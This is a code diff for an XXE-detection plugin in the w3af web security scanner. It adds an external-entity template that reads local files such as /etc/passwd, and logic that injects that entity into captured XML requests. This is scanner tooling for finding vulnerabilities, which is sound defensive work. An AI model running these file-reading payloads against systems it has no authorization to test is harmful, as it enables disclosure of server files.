@@ -20,11 +20,16 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
 import itertools
+import copy
+
+from lxml import etree
 
 import w3af.core.data.constants.severity as severity
+import w3af.core.controllers.output_manager as om
 
 from w3af.core.controllers.plugins.audit_plugin import AuditPlugin
 from w3af.core.data.constants.file_patterns import FILE_PATTERNS
+from w3af.core.data.misc.encoding import smart_str_ignore
 from w3af.core.data.fuzzer.fuzzer import create_mutants
 from w3af.core.data.quick_match.multi_in import MultiIn
 from w3af.core.data.kb.vuln import Vuln
@@ -44,6 +49,9 @@ class xxe(AuditPlugin):
     LINUX_FILES = [
         '/etc/passwd',
     ]
+
+    ENTITY_DEF = '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]>'
+    ENTITY = '&xxe_test;'
 
     GENERIC_PAYLOADS = [
         # This is the most effective payload I've found until now, tested using
@@ -102,6 +110,9 @@ class xxe(AuditPlugin):
         'illegal character code'
     ]
 
+    MAX_XML_PARAM_MUTANTS = 5
+    TOKEN_XXE = '__TOKEN_XXE1__'
+
     file_pattern_multi_in = MultiIn(FILE_PATTERNS)
     parser_errors_multi_in = MultiIn(XML_PARSER_ERRORS)
 
@@ -127,13 +138,17 @@ class xxe(AuditPlugin):
 
         return False
 
-    def _create_payloads(self):
+    def _create_payloads(self, original_value):
         """
         Use the class attributes to create all the payloads, yield them using
         an iterator.
 
         :yield: Payloads as strings
         """
+        #
+        # First we send the generic tests, which don't take the original value
+        # into account and are likely to work on some cases
+        #
         for file_name in itertools.chain(self.WINDOWS_FILES, self.LINUX_FILES):
             for payload in self.GENERIC_PAYLOADS:
                 yield payload % file_name
@@ -145,6 +160,78 @@ class xxe(AuditPlugin):
         for file_name in self.WINDOWS_FILES:
             for payload in self.WINDOWS_PAYLOADS:
                 yield payload % file_name
+
+        #
+        # Now we parse the original value using our XML parser, and modify that
+        # XML in order to inject the payloads there
+        #
+        xml_root = self._parse_xml(original_value)
+        if xml_root is not None:
+            for mutant in self._create_xml_mutants(xml_root):
+                yield mutant
+
+    def _create_xml_mutants(self, xml_root):
+        """
+        This method receives the XML as captured by w3af during crawling and
+        modifies it to add entities which will inject file contents
+
+        Note that we can't use a generic "create xml mutants" since this method
+        needs to do two different things:
+
+            * Add the entity at the beginning of the XML
+            * Add the entity reference as a tag text
+
+        :param xml_root: The xml object as parsed by etree.fromstring
+        :return: A string representing the xml object, with added entities
+        """
+        xml_mutant_count = 0
+
+        for tag in xml_root.iter():
+            if tag.text is None:
+                continue
+
+            tag_orig = tag.text
+            tag.text = self.TOKEN_XXE
+
+            for file_name in itertools.chain(self.WINDOWS_FILES, self.LINUX_FILES):
+                dtd = self.ENTITY_DEF % file_name
+                xml_body = etree.tostring(xml_root).replace(self.TOKEN_XXE, self.ENTITY)
+                yield dtd + xml_body
+
+            # Restore the original value to inject in the next parameter
+            tag.text = tag_orig
+
+            # Test XXE in the first MAX_XML_PARAM_MUTANTS parameters found in the XML
+            xml_mutant_count += 1
+            if xml_mutant_count > self.MAX_XML_PARAM_MUTANTS:
+                break
+
+    def _parse_xml(self, original_value):
+        """
+        Parse the XML into an object
+
+        :param original_value: The XML as sent by the application
+        :return: The XML object or None if parsing failed
+        """
+        # This is a safety measure to prevent us from loading large XML files
+        # into memory (high memory usage) or loading a very complex xml which
+        # might require a lot of CPU time
+        if len(original_value) > 1024 * 1024:
+            return None
+
+        # Secure, don't introduce XXE in our XXE detection plugin ;-)
+        parser = etree.XMLParser(load_dtd=False,
+                                 no_network=True,
+                                 resolve_entities=False)
+
+        try:
+            xml_root = etree.fromstring(smart_str_ignore(original_value), parser=parser)
+        except Exception, e:
+            msg = 'Failed to parse XML to inject XXE tests. Exception was: "%s"'
+            om.out.debug(msg % e)
+            return None
+
+        return xml_root
 
     def _injectable_mutants_iterator(self, mutants):
         """
@@ -158,7 +245,7 @@ class xxe(AuditPlugin):
             if not self._should_inject_parameter(param_name, original_value):
                 continue
 
-            for payload in self._create_payloads():
+            for payload in self._create_payloads(original_value):
                 m = mutant.copy()
                 m.set_token_value(payload)
                 yield m
